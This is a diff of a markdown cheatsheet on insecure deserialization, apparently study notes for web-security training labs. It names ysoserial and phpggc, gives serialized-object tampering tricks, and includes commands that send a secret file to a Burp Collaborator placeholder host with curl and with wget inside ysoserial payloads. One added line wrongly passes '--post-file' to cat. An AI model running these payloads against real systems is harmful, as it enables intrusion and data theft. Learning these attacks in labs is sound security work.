@@ -1,5 +1,5 @@
 
-# Deserialization Insecure  - CHEATSHEET + MOST IMPORTANT LABS LABS
+# Deserialization Insecure  - CHEATSHEET + MOST IMPORTANT LABS
 
 ## Key Terms
 
@@ -9,14 +9,12 @@
 
 - ysoserial        -> Tool that generates malicious Java deserialization payloads using known gadget chains. (use java 8)
 - phpggc           -> Tool that generates malicious PHP serialized objects using gadget chains from popular frameworks.
-
-
 ```
 
 ## Walkthrough - Most Important Labs
 
 
-- [java ysoserial !! PENDIENTE !!]() 
+- [Java deserialization in cookie with Apache Commons](java-des.md) 
 - [PHP deserialization in cookie with a pre-build gadget chain using phpgcc](php-des.md)
 - [Ruby deserialization in cookie using a documented gadget chain (ruby rce exploit)](ruby-des.md)
 
@@ -25,11 +23,16 @@
 
 ```bash
 - b:0?  -> change to -> b:1 
-- access token? -> s:32<token> -> change to ->  b:1
+- access token? -> s:32<token> -> change to ->  b:1   e.g -> s:13:"administrator";s:12:"access_token";b:1
 - backup file -> <file>~  , e.g ->  /libs/CustomTemplate.php~
 
 
 cat /home/carlos/secret.txt | curl -X POST --data-binary @- http://<BURP-COLLAB>
+
+/usr/lib/jvm/java-8-temurin/bin/java -jar ysoserial-all.jar CommonsCollections<N>  '/usr/bin/wget --post-file /home/carlos/secret https://<BURP-COLLAB>' | base64 -w 0;echo
+
+/usr/lib/jvm/java-8-temurin/bin/java -jar ysoserial-all.jar CommonsCollections<N>  '/usr/bin/cat --post-file /home/carlos/secret https://<BURP-COLLAB>'  | base64 -w 0;echo
+
 
 ```
 
